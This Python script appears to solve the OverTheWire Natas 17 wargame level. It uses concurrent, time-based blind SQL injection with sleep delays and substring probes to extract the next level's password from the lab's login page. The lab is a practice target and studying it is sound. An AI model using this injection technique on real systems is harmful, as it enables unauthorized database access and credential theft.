#!/usr/bin/env python3
import asyncio
from aiohttp import BasicAuth, ClientSession
from time import monotonic
from urllib.parse import urlencode


url = 'http://natas17.natas.labs.overthewire.org/index.php?'
auth = BasicAuth('natas17', natas17_pass)

async def send_payload(payload, data, sleep):
    async with ClientSession() as session:
        start = monotonic()
        async with session.get(url+payload, auth=auth) as response:
            await response.wait_for_close()
            elapsed = monotonic() - start
            if elapsed >= sleep:
                return data

async def get_charset(sleep):
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    tasks = []
    charset = ''
    for char in alnum:
        sqli = ('natas18" and '
               f'password like binary "%{char}%" and '
               f'sleep({sleep})#')
        payload = urlencode({'username': sqli})
        tasks.append(asyncio.ensure_future(send_payload(payload, char, sleep)))
    for task in asyncio.as_completed(tasks):
        if result := await task:
            charset += result
    return charset

async def get_substr(index, charset, sleep=1):
    tasks = []
    for char in charset:
        sqli = ('natas18" and '
                f'binary substr(password, {index+1}, 1)="{char}" and '
                f'sleep({sleep})#')
        payload = urlencode({'username': sqli})
        tasks.append(asyncio.ensure_future(send_payload(payload, char, sleep)))
        # Add delay to prevent too many simultaneous requests
        # Increase delay if receiving connection refused error
        # await asyncio.sleep(0.01)
    for task in asyncio.as_completed(tasks):
        if result := await task:
            for t in tasks:
                t.cancel()
            return index, result

async def main(sleep=1):
    charset = await get_charset(sleep)

    tasks = []
    for i in range(32):
        tasks.append(asyncio.ensure_future(get_substr(i, charset, sleep)))
    password = ['_'] * 32
    for task in asyncio.as_completed(tasks):
        index, char = await task
        print(''.join(password), end='', flush=True)
        print('\b'*32, end='', flush=True)
        password[index] = char
    print(''.join(password))


if __name__ == '__main__':
    # Increase sleep duration for high latency networks
    sleep = 1
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(main(sleep))
    loop.run_until_complete(future)
